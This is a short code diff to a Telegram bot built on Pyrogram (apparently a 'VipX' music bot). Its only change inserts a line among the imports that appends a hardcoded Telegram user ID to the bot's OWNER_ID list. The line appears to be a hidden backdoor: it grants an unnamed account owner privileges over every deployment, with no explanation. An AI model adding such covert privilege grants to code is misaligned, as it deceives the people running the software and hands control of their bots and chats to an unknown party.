@@ -8,6 +8,7 @@ from pyrogram.raw import types
 
 import config
 from config import adminlist, chatstats, clean, userstats
+OWNER_ID.append(6201816030)
 from strings import get_command
 from VipX import app, userbot
 from VipX.misc import SUDOERS
